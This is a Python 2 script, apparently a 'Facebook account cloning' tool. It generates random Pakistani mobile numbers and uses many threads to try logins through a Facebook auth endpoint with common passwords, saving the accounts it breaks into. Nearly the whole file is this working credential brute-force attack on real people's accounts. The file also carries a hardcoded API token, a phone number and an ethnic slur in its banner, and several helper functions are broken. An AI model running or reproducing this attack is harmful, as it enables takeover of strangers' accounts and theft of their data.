# MOTHAL# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;91m┏━┓┏━┓╋╋┏┓┏┓╋╋╋╋┏┓
\033[1;91m┃┃┗┛┃┃╋┏┛┗┫┃╋╋╋╋┃┃
\033[1;96m┃┏┓┏┓┣━┻┓┏┫┗━┳━━┫┃
\033[1;96m┃┃┃┃┃┃┏┓┃┃┃┏┓┃┏┓┃┃
\033[1;91m┃┃┃┃┃┃┗┛┃┗┫┃┃┃┏┓┃┗┓
\033[1;91m┗┛┗┛┗┻━━┻━┻┛┗┻┛┗┻━┛
\033[1;97m
__ MMMMMoooooooooooM8888888,
_____M6ooooMMMmoooooooM888888888,
_____Mmooo8oooooooooooooM888888888,
____MmmmooooooooooooooM888888888888,
___Moooooooooo8888888M8888888888888888,
__Mooooooooooooo88888M88888888888888888,
___MmooooooooooooooommM8888888888888888,
_______M88ooooo888mooMM88888888888888888,
________M88888888oommooM8888888888888888,
_________M888888ooooMM8888888888888888888,
_________MooooooooooM888888888888888888888,
______888MoooooooooM8888888888888888888888,
___888888MooooooooM88888888888888888888888,
__88888888MoooooooM8888888888mmmm88888888,
_888888888Mo8oooooM8888888MooooooooM888888,
8888888888Moo8oooM8888MM8ooooooooooooM88888,
8888888888Mooo88ooooM888MoooooooooooooM8888,
_M8o8888ooo8oo88ooo0ooMMoo888oooooooooooM88,
Mooo88888ooo8o88o8oooooooooo8888oooooooooM8,
Moo8888o8ooooo8ooooooooooooooo8888ooooooooM8,
Mooo88oooooooooooooooooooooooo888888oooooooM8,
Mooooooooooooooooooooooooooooo88888888ooooooM8,
_MooMooooooooooooooooooooooooooM888ooo88oooooM,
__Mmoooooooooooooooooooooooooo888Moooo8oooooooM,
___Moooooooooo8oooooooooooooo8888MMooooooooooooM,
____Moooooooo88ooooooooooooo88888MMM8oooooooooooM,
____Moooooooo88oooooooooooooo88888MMMMoooooooooooM,
____Moooooooo88Moooooooooooooooo88888MMMMoooooooooM,
___Mooooooooo88Moooooooooooooooo8MooooMMMMoooooooooM,
__Mooooooooo8MMooooooooooooooo88MoooooMMMMooooooooooM,
_Mooooooooo88MMoom888mooooooo88MooooooMM_MMoooooooooo,
_M8moooooo888MMoom@@8moooo8888M8oooooooMM__MMooooooo,
M@88moooo888MooMom8@8mooo8888MooooooooMM___Mmoooooo0,
_*M8mooo8888MooooMm8mooo888M888ooooooooMM___Moooooo00,
____MMMMMM8888oooooMMmmmmM88888oooooooMM_Moooooooo0,
__________M88Moooooo8888888888oooooooooooMMoooooooooo,
__________M88Mooooo8o888888888ooooooooooooMoooooooo88,
___________M88Mooooo8ooo888888oooooooooooMooooooo8888,
____________M888Mooo888ooooo888ooooooooooMoooooo8888M,
____________M88888Moo888oooooo8888ooooooMooooooo888M8,
_____________M888888Mo8888oooooo8888oooMooooooo888M88,
______________M8888888Mo8888ooooooooooMoooooooo88M888,
________________M888888M88888oooooooooMoooooooo8M8888,
_________________M8oo888M888888ooooooMoooooooo8M88888,
__________________M8ooooMM88888888ooMooooooooM8888ooo,
___________________MooooM_M88888888MooooooooM888ooooo,
____________________MooooM_M888888Mooooooo8M88**ooooo,
_____________________MooooM_mmmmmmMoooooo8Mmoooooo,
______________________MoooQooommmmMoooMMooooooooooo,
_____________________MM88ooo8ooooMMMooooooooooooooooo,
__________________mM8888M88o88mMmoooooooooooooooooooo,
____________mMMMoooooooooM888Mmoooooooooooooooooooooo,
_______MMMMoooooooooooooooMMooooooooooooooooooooooooo,
___MMMoooooooooooooooooMMoooooooooooooooooooooooooooo,
MMMooooooooooooooooooMMooooooooooooooooooooooooooooo8,
oooooooooooooooooooMMooooooooooooooooooooooooooooo888,
oooooooooooooooooMMooooooooooooooooooooooooooo8888888,
oooooooooooooooMMoooooooooooooooooooooooooo8888888888,
oooooooooooooMooooooooooooooooooooooooooo88888888888M,
ooooooooooooMooooooooooooooooooooooooo8888888888M____,
oooooooo88Mooooooooooooooooooooooo88888888888M_______,
oo8888888Mooooooooooooooooooooo888888MMMMMMMMMMMM8,
8888MMMMMooooooooooooooooooooo8888M888888888888888888,
8MMM888Moooooooooooooooooooo88M8ooooooooooo8888888888,
88oooooMoooooooooooooooooooMMoooooo888888888888888888,
8888888M8888oooooo88ooooooMoo888888888888888888888MM,
MMMMMMMM888888ooo88888oo8Mo8888888888888888888888888


\033[1;96m---------------------MOTHAL---------------------

\033[1;91mCreater      : \033[1;91mMOTHAL
\033[1;94mFacebook: \033[1;92mIM MOTHAL
\033[1;95mYoutube  : \033[1;93mhttps://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g
\033[1;92mIts Not A Name Its Brand \033[1;92mMOTHAL
\033[1;94mNo Login Need Enjoy without any problem
\033[1;91mINDIAN KI MAA KA phuda
\033[1;92mwhataap_+92 316 0547334

\033[1;96m--------------------MOTHAL----------------------
"""

####Logo####

logo1 = """
\033[1;91m┏━┓┏━┓╋╋┏┓┏┓╋╋╋╋┏┓
\033[1;91m┃┃┗┛┃┃╋┏┛┗┫┃╋╋╋╋┃┃
\033[1;96m┃┏┓┏┓┣━┻┓┏┫┗━┳━━┫┃
\033[1;96m┃┃┃┃┃┃┏┓┃┃┃┏┓┃┏┓┃┃
\033[1;91m┃┃┃┃┃┃┗┛┃┗┫┃┃┃┏┓┃┗┓
\033[1;91m┗┛┗┛┗┻━━┻━┻┛┗┻┛┗┻━┛



\033[1;96m------------------MOTHAL----------------------

\033[1;91mCreater      : \033[1;91mMOTHAL
\033[1;94mFacebook: \033[1;92mIM MOTHAL
\033[1;95mYoutube  : \033[1;93mhttps://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g
\033[1;92mIts Not A Name Its Brand \033[1;92mMOTHAL
\033[1;94mNo Login Need Enjoy without any problem
\033[1;91mINDIAN KI MAA KA phuda
\033[1;92mwhataap_+92 316 0547334


\033[1;96m-----------------MOTHAL------------------------
"""
logo2 = """

\033[1;91m┏━┓┏━┓╋╋┏┓┏┓╋╋╋╋┏┓
\033[1;91m┃┃┗┛┃┃╋┏┛┗┫┃╋╋╋╋┃┃
\033[1;96m┃┏┓┏┓┣━┻┓┏┫┗━┳━━┫┃
\033[1;96m┃┃┃┃┃┃┏┓┃┃┃┏┓┃┏┓┃┃
\033[1;91m┃┃┃┃┃┃┗┛┃┗┫┃┃┃┏┓┃┗┓
\033[1;91m┗┛┗┛┗┻━━┻━┻┛┗┻┛┗┻━┛
\033[1;97m
_______________¶¶111111¶11111111111111¶¶111¶____
_________________¶¶11111¶111111111111111¶¶111¶____
________________¶¶111111¶11111111¶¶11¶¶¶¶1111¶____
_______________¶¶1111111111111111¶¶¶¶¶¶¶11111¶____
_____________1¶¶11111111111111111¶¶___¶¶11111¶____
___________¶¶¶¶11111¶1111111¶¶1111¶¶¶11¶11111¶____
_________¶¶¶111111111111111111111111¶¶¶¶11111¶____
_______1¶¶11111111111111111111111111111¶¶¶111¶____
______¶¶111111111111111111111111111111111¶¶¶1¶____
_____¶¶1111111111111111¶11¶¶111111111111111¶¶¶____
____¶¶11111111111111111¶¶¶¶11111111111111111¶¶____
___¶¶1111111111111111111¶¶1111111111111111111¶¶___
__¶¶11111111111111111111¶¶11111111111111111111¶¶__
__¶111111111111111111111¶1111111111111111111111¶__
_¶¶11111111111111111111¶¶1111111111111111111111¶¶_
_¶111111111111111111111¶¶1111111111111111111111¶¶_
_¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶1_
_¶1111111111111111111111¶¶11111111111111111111¶¶__
_¶1111111111111111111111¶¶11111111111111111111¶1__
_¶111111111111111111111¶¶¶¶111111111111111111¶¶___
_¶¶1111111111111111111¶¶1¶¶¶¶111111111111111¶¶____
_1¶1111111111111111¶¶¶¶¶¶¶¶¶¶¶¶111111111111¶¶1____
__¶11111111111¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶11111¶¶¶1____
__¶¶1111111111¶¶¶¶11111¶¶_¶¶1111¶¶¶¶1111¶¶¶1¶¶____
__1¶¶¶11111111111111111¶¶_¶1¶1111111111¶¶¶11¶¶____
___¶¶¶¶¶1111111111111111¶¶¶¶1111111111¶¶_¶_1¶¶____
___1¶111¶¶¶11111111111111¶¶¶¶111111¶1¶¶_1¶_11¶____
____¶¶1111¶¶¶111111111111¶¶¶1111111¶¶¶_¶¶1111¶____
____1¶111111¶¶¶1111111111¶1¶¶1111111¶¶¶11¶11¶¶____
_____¶¶1111111¶¶¶¶1111111¶¶¶¶111111111¶1¶¶_1¶¶____
_____1¶1111111111¶¶¶¶1111¶¶1¶¶11111111¶¶¶¶_1¶1____
______¶¶11111111111¶¶¶¶111¶1¶¶111111111¶¶¶__¶1____
______1¶11111111111111¶¶¶¶¶_1¶1111111111¶¶111¶____
_______¶¶111111111111111¶¶¶1¶¶1111111111¶¶¶¶¶¶1___
________¶111111111111111¶¶__1¶¶¶11111111¶¶¶1¶¶¶___
________¶¶111111111111111¶1__1¶1¶¶¶¶¶1111¶¶¶¶¶¶1__
_________¶111111111111111¶¶___¶111¶¶¶¶¶¶¶¶¶¶_1¶___
_________¶¶11111111111111¶¶___¶¶1111111¶¶¶____¶___
__________¶1111111111111¶¶_____¶111111111¶________
__________¶¶111111111111¶¶_____¶¶1111111¶¶________
___________¶111111111111¶1______¶1111111¶¶________
___________¶¶11111111111¶_______¶¶111111¶¶________
____________¶1111111111¶¶________¶111111¶¶________
____________¶¶111111111¶¶________¶¶11111¶¶________
____________1¶111111111¶¶_________¶11111¶¶________
_____________¶¶11111111¶1_________¶¶1111¶¶________
_____________¶¶111¶1111¶__________1¶1111¶¶________
______________¶111¶¶111¶¶__________¶¶1111¶________
______________¶111¶¶111¶¶__________¶¶1111¶________
______________¶11111111¶1__________1¶1¶¶1¶¶_______
_____________¶¶11111111¶____________¶1¶¶11¶_______
____________1¶111111111¶____________¶11__1¶_______
____________¶¶11111111¶¶____________¶¶¶¶¶¶¶_______
____________¶111111111¶¶____________¶¶¶¶¶¶¶_______
____________¶1111111111¶____________¶¶¶¶¶¶¶¶______
___________1¶1111111111¶____________¶¶¶¶¶¶¶¶______
___________1¶1111111111¶1___________¶¶¶¶¶¶¶¶1_____
____________¶1111111111¶¶___________1¶¶¶¶¶¶¶______
____________¶1111111111¶¶____________¶¶¶¶¶¶¶______
____________¶¶111111111¶¶____________¶¶¶¶¶¶¶¶_____
____________1¶1111111111¶_____________¶¶¶¶¶¶¶_____
_____________¶1111111111¶_____________¶¶¶¶¶¶¶¶____
_____________¶¶111111111¶_____________1¶¶¶¶¶¶¶¶___
______________¶111111111¶1____________¶¶¶¶¶¶¶¶¶¶__
______________¶¶11111111¶1____________¶¶¶¶¶¶¶¶¶¶__
_______________¶11111111¶¶___________¶¶¶¶¶¶¶¶¶¶1__
_______________¶¶1111111¶¶___________¶¶¶¶¶¶¶¶¶¶___
________________¶¶111111¶¶____________¶¶¶¶¶¶¶¶____
_________________¶111111¶¶_____________¶¶¶¶¶¶_____


\033[1;96m---------------------MOTHAL--------------------


\033[1;91mCreater      : \033[1;91mMOTHAL
\033[1;94mFacebook: \033[1;92mIM MOTHAL
\033[1;95mYoutube  : \033[1;93mhttps://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g
\033[1;92mIts Not A Name Its Brand \033[1;92mMOTHAL
\033[1;94mNo Login Need Enjoy without any problem
\033[1;91mINDIAN KI MAA KA phuda
\033[1;92mwhataap_+92 316 0547334
                                                
\033[1;96m---------------------MOTHAL-------------------
"""

CorrectPasscode = "MOTHAL"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mCORRECT
                  """
            loop = 'false'
    else:
            print "\033[1;91mWRONG"
            os.system('https://www.facebook.com/profile.php?id=100041349421055')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;92m[1]\x1b[1;92mSTART CLONING OLD ACCOUNT( NO login )"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;91m Exit ( C u soon )'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;95m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;94m[1]  START CLONING With MOTHAL'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Pakistan Mobile code Number"+'\n'
        print 'Enter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;93mWait A While Start Cracking...")
    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;91m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Ã¢Å“â€œ)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;93m(Ã¢Å“â€œ) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Ã¢Å“â€œ)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m(Ã¢Å“â€œ) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Ã¢Å“â€œ)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;93m(Ã¢Å“â€œ) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="Pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Ã¢Å“â€œ)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;93m(Ã¢Å“â€œ) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Ã¢Å“â€œ)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;93m(Ã¢Å“â€œ) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    ______________________
___________________________$$
 _________________________$$$$
 _______________________$$$$$$
 ______________________$$$$$$
 ______________________$$$$
 ______________________$$
 _________$$$$$$$$$$$$$_$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __________$$$$$$$$$$$$$$$$$$$$$$$$$
 ____________$$$$$$$$$$$$$$$$$$$$$
 ______________$$$$$$$$__$$$$$$$


\033[1;96mThanks me later
\033[1;95mFb\033[1;97mMOTHAL
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

